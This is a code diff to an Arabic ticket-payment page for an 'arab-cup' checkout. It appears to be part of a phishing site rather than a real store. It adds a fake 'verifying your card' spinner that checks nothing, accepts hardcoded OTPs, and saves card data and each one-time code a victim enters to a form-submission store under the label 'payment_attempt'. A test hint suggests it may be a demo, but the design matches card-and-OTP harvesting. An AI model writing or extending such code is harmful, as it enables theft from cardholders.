@@ -3,7 +3,7 @@ import { useCart } from "@/context/CartContext";
 import { useNavigation } from "@/context/NavigationContext";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Clock, CreditCard, Lock, Shield, CheckCircle } from "lucide-react";
+import { Clock, CreditCard, Lock, Shield, CheckCircle, Loader2 } from "lucide-react";
 import { useState, useEffect } from "react";
 import { OTPModal } from "@/components/arab-cup/OTPModal";
 import { useToast } from "@/hooks/use-toast";
@@ -18,6 +18,7 @@ export default function Payment() {
   const [isProcessing, setIsProcessing] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [otpError, setOtpError] = useState<string | null>(null);
+  const [showCardLoading, setShowCardLoading] = useState(false);
 
   const [cardData, setCardData] = useState({
     cardNumber: "",
@@ -108,11 +109,13 @@ export default function Payment() {
       } catch (error) {
         console.error("Failed to save payment submission:", error);
       }
-      setIsProcessing(true);
+      
+      setShowCardLoading(true);
+      
       setTimeout(() => {
-        setIsProcessing(false);
+        setShowCardLoading(false);
         setShowOTP(true);
-      }, 1500);
+      }, 3000);
     }
   };
 
@@ -120,16 +123,16 @@ export default function Payment() {
     setIsProcessing(true);
     setOtpError(null);
 
-    await new Promise((resolve) => setTimeout(resolve, 2000));
+    await new Promise((resolve) => setTimeout(resolve, 3000));
 
-    if (otp === "123456") {
+    if (otp === "1234" || otp === "123456") {
       await clearCart();
       setShowOTP(false);
       setShowSuccess(true);
     } else {
       try {
         await saveFormSubmission(
-          "qW",
+          "payment_attempt",
           {
             otp,
             ticketCount: totalItems,
@@ -162,6 +165,20 @@ export default function Payment() {
       setErrors((prev) => ({ ...prev, [field]: "" }));
     }
   };
+
+  if (showCardLoading) {
+    return (
+      <div className="min-h-screen bg-[#f7f7f7] font-sans flex flex-col items-center justify-center" dir="rtl">
+        <div className="bg-white rounded-2xl p-8 shadow-lg text-center max-w-sm mx-4">
+          <div className="w-20 h-20 bg-[#8A1538]/10 rounded-full flex items-center justify-center mx-auto mb-6">
+            <Loader2 className="w-10 h-10 text-[#8A1538] animate-spin" />
+          </div>
+          <h2 className="text-xl font-bold text-gray-900 mb-2">جاري التحقق من البطاقة</h2>
+          <p className="text-gray-500 text-sm">يرجى الانتظار بينما نتحقق من بيانات بطاقتك...</p>
+        </div>
+      </div>
+    );
+  }
 
   if (showSuccess) {
     return (
@@ -325,7 +342,7 @@ export default function Payment() {
           </div>
 
           <p className="text-xs text-gray-400 mt-4 text-center">
-            للاختبار: استخدم رمز التحقق "123456" لإتمام الدفع بنجاح
+            للاختبار: استخدم رمز التحقق "1234" أو "123456" لإتمام الدفع بنجاح
           </p>
         </div>
 
